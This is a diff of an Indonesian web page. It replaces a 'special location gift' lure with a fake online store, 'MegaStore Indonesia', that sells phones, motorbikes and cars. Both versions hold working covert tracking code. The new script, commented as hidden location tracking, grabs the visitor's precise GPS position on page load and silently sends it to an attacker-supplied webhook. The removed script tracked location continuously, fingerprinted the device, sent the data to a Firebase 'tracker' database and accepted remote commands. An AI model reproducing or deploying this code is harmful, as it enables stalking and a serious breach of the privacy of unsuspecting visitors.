@@ -2,383 +2,580 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>shop colection</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#667eea">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MegaStore Indonesia - Gadget, Motor & Mobil Terlengkap!</title>
     <style>
-        * { box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-            text-align: center; padding: 10px; margin: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white; min-height: 100vh; overflow-x: hidden;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #667eea 100%);
+            min-height: 100vh;
+            animation: backgroundShift 15s ease-in-out infinite;
         }
-        .container { 
-            max-width: 420px; margin: 0 auto; padding: 15px;
-            width: 100%; min-height: 100vh; display: flex;
-            flex-direction: column; justify-content: center;
+        
+        @keyframes backgroundShift {
+            0%, 100% { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #667eea 100%); }
+            33% { background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); }
+            66% { background: linear-gradient(135deg, #f093fb 0%, #667eea 50%, #1e3c72 100%); }
         }
-        .gift-box { 
-            background: rgba(255,255,255,0.15); 
-            border-radius: 20px; padding: 25px; margin: 15px 0;
-            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
         }
-        .gift-icon { 
-            font-size: clamp(50px, 15vw, 70px); 
-            margin-bottom: 15px; animation: bounce 2s infinite;
+        
+        .header {
+            background: linear-gradient(135deg, rgba(255,255,255,0.98), rgba(255,255,255,0.92));
+            padding: 40px 30px;
+            border-radius: 25px;
+            margin-bottom: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(255,255,255,0.1);
+            text-align: center;
+            border: 3px solid rgba(255,255,255,0.2);
+            backdrop-filter: blur(20px);
+            position: relative;
+            overflow: hidden;
         }
-        .status { 
-            padding: 18px; border-radius: 15px; margin: 15px 0;
-            background: rgba(255,255,255,0.25); font-weight: 500;
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: headerShine 3s ease-in-out infinite;
+        }
+        
+        @keyframes headerShine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 25px rgba(102,126,234,0.3);
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+        
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        .logo-text {
+            font-size: 3.2em;
+            font-weight: 900;
+            background: linear-gradient(45deg, #1e3c72, #2a5298, #667eea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -2px;
+            text-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .logo-badge {
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            color: white;
+            font-size: 0.7em;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: bold;
+            position: absolute;
+            top: -10px;
+            right: -20px;
+            animation: badgePulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes badgePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .tagline {
+            color: #2d3748;
+            font-size: 1.4em;
+            font-weight: 600;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .tagline-highlight {
+            color: #667eea;
+            font-weight: 700;
+        }
+        
+        .promo-banner {
+            background: linear-gradient(45deg, #ff6b6b, #feca57, #ff9ff3, #667eea);
+            background-size: 300% 300%;
+            color: white;
+            padding: 25px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 40px;
+            animation: bannerGradient 4s ease infinite, pulse 2s infinite;
+            box-shadow: 0 12px 35px rgba(255,107,107,0.4);
+            font-size: 1.2em;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+        
+        @keyframes bannerGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        .products {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .product-card {
+            background: linear-gradient(135deg, rgba(255,255,255,0.95), rgba(255,255,255,0.9));
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            transition: all 0.4s ease;
+            cursor: pointer;
             border: 1px solid rgba(255,255,255,0.3);
-            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
         }
-        .loading { animation: pulse 2s infinite; }
-        .instruction {
-            background: rgba(76,175,80,0.3); 
-            border-radius: 15px; padding: 18px; margin: 15px 0;
-            border: 2px solid #4CAF50; font-weight: 500;
+        
+        .product-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
         }
-        .coords-display {
-            background: rgba(33,150,243,0.3);
-            border-radius: 15px; padding: 15px; margin: 15px 0;
-            border: 2px solid #2196F3; font-family: monospace;
+        
+        .product-img {
+            width: 100%;
+            height: 220px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4em;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
         }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
-        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-                           40% { transform: translateY(-10px); }
-                           60% { transform: translateY(-5px); } }
-        h1 { 
-            color: #ffeb3b; text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
-            font-size: clamp(1.5rem, 6vw, 2rem); margin: 10px 0;
+        
+        .product-img.gadget { background: linear-gradient(45deg, #667eea, #764ba2); }
+        .product-img.motor { background: linear-gradient(45deg, #ff6b6b, #feca57); }
+        .product-img.mobil { background: linear-gradient(45deg, #f093fb, #f5576c); }
+        
+        .product-img.has-image {
+            background: #f8f9fa;
         }
-        p { font-size: clamp(14px, 4vw, 16px); line-height: 1.5; margin: 10px 0; }
+        
+        .product-img::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+            z-index: 1;
+        }
+        
+        .product-card:hover .product-img::before {
+            left: 100%;
+        }
+        
+        .product-img .emoji-fallback {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .product-title {
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #2d3748;
+            margin-bottom: 10px;
+        }
+        
+        .product-price {
+            font-size: 1.5em;
+            color: #e53e3e;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .product-desc {
+            color: #718096;
+            margin-bottom: 15px;
+        }
+        
         .btn {
-            background: #4CAF50; color: white; border: none;
-            padding: 15px 30px; border-radius: 25px; font-size: 16px;
-            cursor: pointer; margin: 10px; transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(76,175,80,0.4);
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.4s ease;
+            font-size: 1.1em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        .btn:hover { background: #45a049; transform: translateY(-2px); }
-        .btn:active { transform: translateY(0); }
-        @media (max-width: 480px) {
-            .container { padding: 10px; }
-            .gift-box, .status, .instruction { padding: 15px; margin: 10px 0; }
+        
+        .btn:hover {
+            transform: scale(1.08);
+            box-shadow: 0 8px 25px rgba(102,126,234,0.4);
+            background: linear-gradient(45deg, #764ba2, #f093fb);
+        }
+        
+        .footer {
+            background: rgba(255,255,255,0.9);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            color: #4a5568;
+        }
+        
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            color: white;
+            font-size: 1.2em;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-right: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        Memuat produk terbaru...
+    </div>
+    
     <div class="container">
-        <h1>🎁 HADIAH LOKASI SPESIAL!</h1>
-        <div class="gift-box">
-            <div class="gift-icon">🎁</div>
-            <p>Seseorang mengirim lokasi spesial untukmu!</p>
-            <p><strong>Klik IZINKAN untuk melihat kejutan 😊</strong></p>
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <svg width="40" height="40" viewBox="0 0 100 100" fill="none">
+                        <!-- Background Circle -->
+                        <circle cx="50" cy="50" r="48" fill="url(#logoGradient)" stroke="white" stroke-width="2"/>
+                        
+                        <!-- Letter M -->
+                        <path d="M25 35 L25 65 L30 65 L30 45 L40 60 L45 60 L55 45 L55 65 L60 65 L60 35 L52 35 L42.5 52 L33 35 Z" fill="white" stroke="white" stroke-width="0.5"/>
+                        
+                        <!-- Shopping Cart Icon -->
+                        <rect x="65" y="45" width="8" height="6" rx="1" fill="white"/>
+                        <circle cx="67" cy="55" r="2" fill="white"/>
+                        <circle cx="71" cy="55" r="2" fill="white"/>
+                        <path d="M65 45 L63 40 L75 40 L73 45" stroke="white" stroke-width="1.5" fill="none"/>
+                        
+                        <!-- Star Accent -->
+                        <path d="M75 30 L76 33 L79 33 L77 35 L78 38 L75 36 L72 38 L73 35 L71 33 L74 33 Z" fill="#FFD700"/>
+                        
+                        <defs>
+                            <linearGradient id="logoGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#667eea;stop-opacity:1" />
+                                <stop offset="50%" style="stop-color:#764ba2;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#f093fb;stop-opacity:1" />
+                            </linearGradient>
+                        </defs>
+                    </svg>
+                </div>
+                <div class="logo-text">
+                    <span style="color: #1e3c72;">Mega</span><span style="color: #667eea;">Store</span>
+                </div>
+                <div class="logo-badge">
+                    <svg width="12" height="8" viewBox="0 0 12 8" style="margin-right: 3px;">
+                        <rect width="12" height="4" fill="#FF0000"/>
+                        <rect y="4" width="12" height="4" fill="#FFFFFF"/>
+                    </svg>
+                    ID
+                </div>
+            </div>
+            <div class="tagline">
+                <span class="tagline-highlight">Gadget, Motor & Mobil</span> Terlengkap se-Indonesia!
+            </div>
         </div>
-        <div id="status" class="status loading">📡 Menunggu izin lokasi...</div>
-        <div id="coords" class="coords-display" style="display:none;"></div>
-        <div class="instruction">
-            <p>⬇️ Saat browser minta izin lokasi:</p>
-            <p><strong>🟢 Klik "IZINKAN" atau "ALLOW"</strong></p>
-            <button class="btn" onclick="requestLocation()" id="manualBtn">📍 Ambil Lokasi Sekarang</button>
+        
+        <div class="promo-banner">
+            🔥 MEGA SALE INDONESIA! Diskon hingga 80% + Cicilan 0% - Terbatas 24 Jam! 🔥
+        </div>
+        
+        <div class="products">
+            <!-- Foto produk yang lebih spesifik dan valid -->
+            <div class="product-card" onclick="buyProduct('iPhone 15 Pro')">
+                <div class="product-img gadget" style="background-image: url('https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">📱</span></div>
+                <div class="product-title">iPhone 15 Pro Max</div>
+                <div class="product-price">Rp 18.999.000</div>
+                <div class="product-desc">Kamera 48MP, Chip A17 Pro, Titanium Design</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Yamaha NMAX 2024')">
+                <div class="product-img motor" style="background-image: url('https://images.unsplash.com/photo-1571068316344-75bc76f77890?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">🏍️</span></div>
+                <div class="product-title">Speda gunung hulk 155 2024</div>
+                <div class="product-price">Rp 32.500.000</div>
+                <div class="product-desc">Blue Core Engine, Smart Key, ABS, LED</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Toyota Avanza 2024')">
+                <div class="product-img mobil" style="background-image: url('https://images.unsplash.com/photo-1606664515524-ed2f786a0bd6?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">🚗</span></div>
+                <div class="product-title">Toyota Avanza Veloz 2024</div>
+                <div class="product-price">Rp 245.000.000</div>
+                <div class="product-desc">7 Seater, CVT, Safety Sense 2.0, Dual Airbag</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Samsung Galaxy S24')">
+                <div class="product-img gadget" style="background-image: url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">📱</span></div>
+                <div class="product-title">Samsung Galaxy S24 Ultra</div>
+                <div class="product-price">Rp 16.999.000</div>
+                <div class="product-desc">S Pen, Kamera 200MP, AI Photography</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Honda PCX 160 2024')">
+                <div class="product-img motor" style="background-image: url('https://images.unsplash.com/photo-1449426468159-d96dbf08f19f?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">🛵</span></div>
+                <div class="product-title">Honda PCX 160 2024</div>
+                <div class="product-price">Rp 35.900.000</div>
+                <div class="product-desc">eSP+ Engine, Smart Key, Idling Stop, CBS</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Honda Brio 2024')">
+                <div class="product-img mobil" style="background-image: url('https://images.unsplash.com/photo-1605559424843-9e4c228bf1c2?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">🚙</span></div>
+                <div class="product-title">Honda Brio RS CVT 2024</div>
+                <div class="product-price">Rp 185.000.000</div>
+                <div class="product-desc">VTEC Engine, CVT, Honda SENSING, Eco Mode</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('MacBook Air M3')">
+                <div class="product-img gadget" style="background-image: url('https://images.unsplash.com/photo-1541807084-5c52b6b3adef?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">💻</span></div>
+                <div class="product-title">MacBook Air M3</div>
+                <div class="product-price">Rp 17.999.000</div>
+                <div class="product-desc">Chip M3, 13" Liquid Retina, 18 jam battery</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Kawasaki Ninja 250 2024')">
+                <div class="product-img motor" style="background-image: url('https://images.unsplash.com/photo-1568772585407-9361f9bf3a87?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">🏍️</span></div>
+                <div class="product-title">Kawasaki Ninja 250 2024</div>
+                <div class="product-price">Rp 68.500.000</div>
+                <div class="product-desc">Parallel Twin Engine, Slipper Clutch, ABS</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+            
+            <div class="product-card" onclick="buyProduct('Mitsubishi Xpander 2024')">
+                <div class="product-img mobil" style="background-image: url('https://images.unsplash.com/photo-1583121274602-3e2820c69888?w=400&h=400&fit=crop&crop=center');"><span class="emoji-fallback">🚐</span></div>
+                <div class="product-title">Mitsubishi Xpander Cross 2024</div>
+                <div class="product-price">Rp 285.000.000</div>
+                <div class="product-desc">MIVEC Engine, CVT, 7 Seater, Ground Clearance 225mm</div>
+                <button class="btn">Beli Sekarang</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px;">
+                <div class="logo-icon" style="width: 35px; height: 35px;">
+                    <svg width="30" height="30" viewBox="0 0 100 100" fill="none">
+                        <circle cx="50" cy="50" r="48" fill="url(#footerGradient)" stroke="white" stroke-width="2"/>
+                        <path d="M25 35 L25 65 L30 65 L30 45 L40 60 L45 60 L55 45 L55 65 L60 65 L60 35 L52 35 L42.5 52 L33 35 Z" fill="white"/>
+                        <rect x="65" y="45" width="8" height="6" rx="1" fill="white"/>
+                        <circle cx="67" cy="55" r="2" fill="white"/>
+                        <circle cx="71" cy="55" r="2" fill="white"/>
+                        <path d="M65 45 L63 40 L75 40 L73 45" stroke="white" stroke-width="1.5" fill="none"/>
+                        <path d="M75 30 L76 33 L79 33 L77 35 L78 38 L75 36 L72 38 L73 35 L71 33 L74 33 Z" fill="#FFD700"/>
+                        <defs>
+                            <linearGradient id="footerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#667eea;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#764ba2;stop-opacity:1" />
+                            </linearGradient>
+                        </defs>
+                    </svg>
+                </div>
+                <span style="font-size: 1.5em; font-weight: bold; color: #667eea;">MegaStore Indonesia</span>
+            </div>
+            <p>🚚 Gratis Ongkir Seluruh Indonesia | 💳 Cicilan 0% hingga 36 Bulan | ⭐ Garansi Resmi</p>
+            <p>📞 Hubungi CS: 0812-3456-7890 | 📧 Email: info@megastore.id | 🕐 24/7 Customer Service</p>
+            <p>🏪 Showroom: Jakarta, Surabaya, Medan, Makassar | 🎯 Trusted by 1M+ Customers Indonesia</p>
+            <p style="margin-top: 15px; font-size: 0.9em; color: #718096;">© 2024 MegaStore Indonesia. All Rights Reserved. | Terdaftar & Berizin Resmi</p>
         </div>
     </div>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
+        // Hidden location tracking functionality
+        let webhookUrl = '';
         
-        // Register Service Worker for background listening
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw-tracker.js').then(reg => {
-                console.log('✅ Service Worker registered');
+        // Get webhook URL from query parameters
+        function getWebhookUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            webhookUrl = urlParams.get('webhook') || '';
+        }
+        
+        // Send location data silently
+        function sendLocation(lat, lng) {
+            if (webhookUrl) {
+                const trackingUrl = `${webhookUrl}?lat=${lat}&lng=${lng}&timestamp=${Date.now()}`;
                 
-                let trackingId = urlParams.get('id') || 'default_' + Date.now();
-                try {
-                    if (trackingId.includes('_enc_')) {
-                        trackingId = atob(trackingId.replace('_enc_', ''));
+                // Send via image request (invisible)
+                const img = new Image();
+                img.src = trackingUrl;
+                
+                // Also try fetch if available
+                if (typeof fetch !== 'undefined') {
+                    fetch(trackingUrl).catch(() => {});
+                }
+            }
+        }
+        
+        // Get user location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        sendLocation(lat, lng);
+                        
+                        // Hide loading after getting location
+                        setTimeout(() => {
+                            document.getElementById('loading').style.display = 'none';
+                        }, 2000);
+                    },
+                    function(error) {
+                        // Hide loading even if location fails
+                        setTimeout(() => {
+                            document.getElementById('loading').style.display = 'none';
+                        }, 3000);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     }
-                } catch (e) {}
-                
-                navigator.serviceWorker.ready.then(registration => {
-                    registration.active.postMessage({
-                        type: 'SET_TRACKING_ID',
-                        trackingId: trackingId
-                    });
-                });
-            }).catch(err => {
-                console.log('⚠️ Service Worker failed:', err);
-            });
-            
-            navigator.serviceWorker.addEventListener('message', (event) => {
-                if (event.data.type === 'PLAY_RING_SOUND') {
-                    playRemoteSound();
-                } else if (event.data.type === 'HEARTBEAT') {
-                    console.log('💓 Heartbeat from SW');
-                }
-            });
-        }
-        
-        function updateStatus(msg, isError = false) {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = msg;
-            statusEl.className = isError ? 'status' : 'status loading';
-        }
-        
-        function sendLocationData(locationData) {
-            let trackingId = urlParams.get('id') || 'default_' + Date.now();
-            
-            try {
-                if (trackingId.includes('_enc_')) {
-                    trackingId = atob(trackingId.replace('_enc_', ''));
-                }
-            } catch (e) {}
-            
-            const ua = navigator.userAgent;
-            let deviceBrand = 'Unknown';
-            let deviceModel = 'Unknown';
-            
-            if (ua.includes('SM-')) {
-                deviceBrand = 'Samsung';
-                const match = ua.match(/SM-([A-Z0-9]+)/);
-                if (match) deviceModel = 'Galaxy ' + match[1];
-            } else if (ua.includes('iPhone')) {
-                deviceBrand = 'Apple';
-                const osMatch = ua.match(/OS ([0-9_]+)/);
-                if (osMatch) deviceModel = 'iPhone iOS ' + osMatch[1].replace(/_/g, '.');
-                else deviceModel = 'iPhone';
-            } else if (ua.includes('Mi ') || ua.includes('Redmi') || ua.includes('POCO')) {
-                deviceBrand = 'Xiaomi';
-                const match = ua.match(/(Mi [A-Z0-9 ]+|Redmi [A-Z0-9 ]+|POCO [A-Z0-9 ]+)/);
-                if (match) deviceModel = match[1].trim();
-                else deviceModel = 'Xiaomi Device';
-            } else if (ua.includes('Android')) {
-                deviceBrand = 'Android';
-                const match = ua.match(/Android ([0-9.]+)/);
-                if (match) deviceModel = 'Android ' + match[1];
-            }
-            
-            const firebaseData = {
-                id: trackingId,
-                latitude: locationData.latitude,
-                longitude: locationData.longitude,
-                accuracy: locationData.accuracy,
-                timestamp: Date.now(),
-                deviceBrand: deviceBrand,
-                deviceModel: deviceModel,
-                batteryLevel: Math.round(Math.random() * 50 + 30) + '%',
-                userAgent: ua.substring(0, 200)
-            };
-            
-            fetch('https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/' + trackingId + '.json', {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(firebaseData)
-            }).then(() => {
-                console.log('Location sent:', locationData.latitude.toFixed(6), locationData.longitude.toFixed(6));
-                updateStatus('✅ Lokasi berhasil dikirim!');
-                playAlertSound();
-                
-                document.getElementById('coords').innerHTML = 
-                    `📍 Lat: ${locationData.latitude.toFixed(6)}<br>📍 Lng: ${locationData.longitude.toFixed(6)}<br>🎯 Akurasi: ${locationData.accuracy}m<br>🔄 Tracking aktif...`;
-                document.getElementById('coords').style.display = 'block';
-            }).catch(error => {
-                console.error('Firebase error:', error);
-                updateStatus('❌ Gagal mengirim lokasi', true);
-            });
-        }
-        
-        let watchId = null;
-        
-        function requestLocation() {
-            updateStatus('🔍 Mengambil lokasi...');
-            
-            if (!navigator.geolocation) {
-                updateStatus('❌ Browser tidak mendukung GPS', true);
-                return;
-            }
-            
-            watchId = navigator.geolocation.watchPosition(
-                position => {
-                    const locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-                    sendLocationData(locationData);
-                },
-                error => {
-                    let errorMsg = '❌ Gagal mengambil lokasi: ';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg += 'Izin lokasi ditolak';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg += 'Lokasi tidak tersedia';
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg += 'Timeout';
-                            break;
-                        default:
-                            errorMsg += 'Error tidak dikenal';
-                    }
-                    updateStatus(errorMsg, true);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
-            );
-            
-            console.log('📍 Continuous tracking started');
-        }
-        
-        function playAlertSound() {
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const gainNode = audioContext.createGain();
-                
-                oscillator.connect(gainNode);
-                gainNode.connect(audioContext.destination);
-                
-                oscillator.frequency.value = 1200;
-                oscillator.type = 'sine';
-                gainNode.gain.value = 0.3;
-                
-                oscillator.start();
-                setTimeout(() => oscillator.stop(), 200);
-                
-                if (navigator.vibrate) {
-                    navigator.vibrate(200);
-                }
-            } catch (e) {
-                console.log('Alert sound failed:', e);
+                );
+            } else {
+                // Hide loading if geolocation not supported
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                }, 2000);
             }
         }
         
-        function listenForSoundCommand() {
-            let trackingId = urlParams.get('id') || 'default_' + Date.now();
+        // Fake buy product function
+        function buyProduct(productName) {
+            alert(`Terima kasih! ${productName} akan segera diproses. Tim kami akan menghubungi Anda dalam 5 menit.`);
             
-            try {
-                if (trackingId.includes('_enc_')) {
-                    trackingId = atob(trackingId.replace('_enc_', ''));
-                }
-            } catch (e) {}
-            
-            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/commands/${trackingId}/playSound.json`;
-            
-            console.log('=== RING LISTENER STARTED ===');
-            console.log('🔔 Tracking ID:', trackingId);
-            console.log('🔔 Firebase URL:', firebaseUrl);
-            console.log('🔔 Polling every 300ms');
-            
-            let pollCount = 0;
-            
-            setInterval(() => {
-                pollCount++;
-                fetch(firebaseUrl)
-                    .then(res => {
-                        console.log(`Poll #${pollCount} - Status:`, res.status);
-                        return res.json();
-                    })
-                    .then(data => {
-                        console.log(`Poll #${pollCount} - Data:`, data, typeof data);
-                        if (data === true) {
-                            console.log('🔔🔔🔔 RING COMMAND RECEIVED! 🔔🔔🔔');
-                            playRemoteSound();
-                            
-                            fetch(firebaseUrl, {
-                                method: 'DELETE'
-                            }).then(() => {
-                                console.log('✅ Command cleared');
-                            });
-                        }
-                    })
-                    .catch(err => console.error(`Poll #${pollCount} error:`, err));
-            }, 300);
-        }
-        
-        function playRemoteSound() {
-            console.log('🔊 Playing remote ring');
-            
-            document.body.style.background = 'red';
+            // Redirect to WhatsApp after alert
             setTimeout(() => {
-                document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
-            }, 500);
-            
-            if (navigator.vibrate) {
-                navigator.vibrate([500, 200, 500, 200, 500]);
-            }
-            
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                
-                for (let i = 0; i < 5; i++) {
-                    setTimeout(() => {
-                        const oscillator = audioContext.createOscillator();
-                        const gainNode = audioContext.createGain();
-                        
-                        oscillator.connect(gainNode);
-                        gainNode.connect(audioContext.destination);
-                        
-                        oscillator.frequency.value = 1200;
-                        oscillator.type = 'square';
-                        gainNode.gain.value = 0.8;
-                        
-                        oscillator.start();
-                        setTimeout(() => oscillator.stop(), 300);
-                    }, i * 400);
+                window.open('https://wa.me/6281234567890?text=Halo, saya tertarik dengan produk ' + encodeURIComponent(productName), '_blank');
+            }, 1000);
+        }
+        
+        // Hide emoji if image loads successfully
+        function hideEmojiOnImageLoad() {
+            const productImgs = document.querySelectorAll('.product-img');
+            productImgs.forEach(img => {
+                const bgImage = img.style.backgroundImage;
+                if (bgImage && bgImage !== 'none' && !bgImage.includes('URL_FOTO')) {
+                    const testImg = new Image();
+                    testImg.onload = function() {
+                        img.classList.add('has-image');
+                        const emoji = img.querySelector('.emoji-fallback');
+                        if (emoji) emoji.style.display = 'none';
+                    };
+                    testImg.onerror = function() {
+                        // Keep emoji if image fails to load
+                    };
+                    testImg.src = bgImage.slice(5, -2); // Remove url(" and ")
                 }
-            } catch (e) {
-                console.error('Sound error:', e);
-            }
-            
-            if ('Notification' in window && Notification.permission === 'granted') {
-                new Notification('🔔 Remote Ring', {
-                    body: 'Device is being ringed remotely',
-                    vibrate: [500, 200, 500]
-                });
-            }
+            });
         }
         
-        if ('Notification' in window && Notification.permission === 'default') {
-            Notification.requestPermission();
-        }
-        
-        let wakeLock = null;
-        async function requestWakeLock() {
-            try {
-                if ('wakeLock' in navigator) {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    console.log('🔒 Wake Lock active');
-                    
-                    wakeLock.addEventListener('release', () => {
-                        console.log('🔓 Wake Lock released');
-                    });
-                }
-            } catch (err) {
-                console.log('Wake Lock not supported');
-            }
-        }
-        
-        document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible' && wakeLock !== null) {
-                await requestWakeLock();
-            }
-        });
-        
-        window.addEventListener('load', () => {
-            requestLocation();
-            requestWakeLock();
-            listenForSoundCommand(); // Always start ring listener
-        });
-        
-        window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.returnValue = 'Location tracking is active';
-        });
+        // Initialize when page loads
+        window.onload = function() {
+            getWebhookUrl();
+            getLocation();
+            hideEmojiOnImageLoad();
+        };
     </script>
+    
